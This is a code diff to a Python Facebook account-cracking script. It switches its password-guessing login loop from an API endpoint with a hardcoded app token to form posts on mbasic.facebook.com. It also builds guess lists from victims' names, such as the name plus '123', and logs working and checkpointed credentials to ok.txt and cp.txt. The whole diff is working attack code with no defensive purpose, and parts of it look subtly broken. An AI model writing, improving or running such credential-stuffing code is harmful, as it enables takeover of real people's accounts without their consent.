@@ -2,7 +2,7 @@
 #-*-coding:utf-8-*-
 
 try:
-    import requests,bs4,sys,os,subprocess,datetime,shutil,sys,random,time,re,base64,json,glob,mm
+    import requests,bs4,sys,os,subprocess,datetime,shutil,sys,random,time,re,base64,json,glob,nn
     from concurrent.futures import ThreadPoolExecutor as NeMo
     from bs4 import BeautifulSoup as parser
 except ImportError:
@@ -86,17 +86,17 @@ class __crack__:
         for pw in __emo__:
             pw = pw.lower()
             ngUA = 'Mozilla/5.0 (Series40; NokiaC2-02/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45'
-            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ngUA, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
-            api = 'https://b-api.facebook.com/method/auth.login'
-            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
-            response = requests.get(api, params=params, headers=headers_)
-            if 'access_token' in response.text and 'EAAA' in response.text:
+            ses = requests.Session()
+            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ngUA,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            p = ses.get("https://mbasic.facebook.com")
+            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
+            if "c_user" in ses.cookies.get_dict().keys():
                 wrt = '%s|%s' % (user,pw)
                 ok.append(wrt)
                 open('ok.txt','a').write('%s\n' % wrt)
                 break
                 continue
-            elif 'www.facebook.com' in response.json()['error_msg']:
+            elif "checkpoint" in ses.cookies.get_dict().keys():
                 wrt = '%s|%s' % (user,pw)
                 cp.append(wrt)
                 open('cp.txt', 'a').write('%s\n' % wrt)
@@ -113,10 +113,10 @@ class __crack__:
                 try:
                     uid, name = omen.split('<=>')
                     xz = name.split(' ')
-                    if len(x) == 3 or len(x) == 4 or len(x) == 5 or len(x) == 6:
+                    if len(xz) == 3 or len(xz) == 4:
                         pwx = [name, xz[0]+"123", x+"1234", x+"12345"]
                     else:
-                        pwx = [name]
+                        pwx = [name, x+"123"]
                     __nemoXD__.submit(self.__api__, uid, pwx)
                 except:
                     pass
